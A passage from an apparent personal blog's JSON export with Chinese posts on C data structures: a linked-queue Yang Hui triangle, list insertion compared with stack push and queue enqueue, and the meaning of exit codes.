void YanghuiTriangle(int N) { int i,n,x,temp; linkqueue q; initqueue(&amp;q); enterqueue(&amp;q,1);//第一行入队 for(n=2;n&lt;=N;n++)//由第i行转换为i-1行 { enterqueue(&amp;q,1);//第n行第一个元素入队 for(i=1;i&lt;=n-2;i++)/*将n-1行，有n-1个元素*/ { deletequeue(&amp;q,&amp;temp);//删除当前队列中第一个元素（1） printf(&quot;%d\\t&quot;,temp);/*从第1个数到第n-2个数输出*/ gettop(q,&amp;x); temp+=x;//获得当前队列中第一个元素值，并将其相加（2） //（1）（2）并不相同 enterqueue(&amp;q,temp);//分别将n行的，从第二个数到第n-1个 //数入队列 } deletequeue(&amp;q,&amp;x);//将n-1行的，最后一个数，删除，并输出 printf(&quot;%d\\t&quot;,x); enterqueue(&amp;q,1);//将第n行的，最后一个数，进入队列中 printf(&quot;\\n&quot;); } }讲了很多，将队列的元素的记录写下来写几个===》（队头方向）1 3 3 1 1 2 1 1 1 1—④——③—②-① 吃饭去了","categories":[],"tags":[{"name":"队列","slug":"队列","permalink":"http://yoursite.com/tags/%E9%98%9F%E5%88%97/"},{"name":"数据结构","slug":"数据结构","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"压链栈与进链队列和创建线性表的关系","slug":"压链栈与进链队列和创建线性表的关系","date":"2016-06-12T00:56:17.000Z","updated":"2020-11-14T17:12:19.147Z","comments":true,"path":"2016/06/12/压链栈与进链队列和创建线性表的关系/","link":"","permalink":"http://yoursite.com/2016/06/12/%E5%8E%8B%E9%93%BE%E6%A0%88%E4%B8%8E%E8%BF%9B%E9%93%BE%E9%98%9F%E5%88%97%E5%92%8C%E5%88%9B%E5%BB%BA%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%85%B3%E7%B3%BB/","excerpt":"","text":"首先，来写下1.线性表的头插法 void CreateFromHead(linklist *h) { lisklist *s; char c; c=getchar(); while(c!=&apos;$&apos;) { s=(linklist *)malloc(sizeof(linklist)); s-&gt;data=c; s-&gt;next=h-&gt;next; h-&gt;next=s; c=getchar(); } }进栈的代码 int push(LinkStack *top,StackElemType x) { LinkStack *new; new=(LinkStack)malloc(sizeof(LinkStack)); if(new==NULL)return FALSE; new-&gt;data=x; new-&gt;next=top-&gt;next; top-&gt;next=new; return OK; }2.线性表的尾插法 void CreateFromTail(LinkList *h) { LinkList *tail,*new; tail=h; char c=getchar(); while(c!=&apos;$&apos;) { new=(linklist *)malloc(sizeof(linklist)); new-&gt;data=c; tail-&gt;next=new; tail=new; c=getchar(); } tail-&gt;next=NULL; }链队列的入队 int EnterQueue(LinkQueue *q,QueueElemType x){ LinkQueueNode *newnode; newnode=(LinkQueue*)malloc(sizeof(LinkQueue)); if(newnode==NULL) return FALSE; newnode-&gt;data=x; newnode-&gt;next=NULL; q-&gt;rear-&gt;next=newnode; q-&gt;rear=newnode; return OK; }栈与队列的出现或者说是必然，也是偶然","categories":[],"tags":[{"name":"c语言","slug":"c语言","permalink":"http://yoursite.com/tags/c%E8%AF%AD%E8%A8%80/"},{"name":"线性表","slug":"线性表","permalink":"http://yoursite.com/tags/%E7%BA%BF%E6%80%A7%E8%A1%A8/"},{"name":"栈","slug":"栈","permalink":"http://yoursite.com/tags/%E6%A0%88/"},{"name":"队列","slug":"队列","permalink":"http://yoursite.com/tags/%E9%98%9F%E5%88%97/"}]},{"title":"exit(0),exit(1),exit(-1)的区别","slug":"exit(0),exit(1),exit(-1)的区别","date":"2016-05-09T12:25:36.000Z","updated":"2020-11-14T17:12:19.612Z","comments":true,"path":"2016/05/09/exit(0),exit(1),exit(-1)的区别/","link":"","permalink":"http://yoursite.com/2016/05/09/exit(0),exit(1),exit(-1)%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"exit(0)正常exit(1)和exit(-1)不正常1和-1个人习惯 EXIT_SUCCESS表示正常，EXIT_FAILURE表示失败，定义在stdio.h里。","categories":[],"tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"}]}]}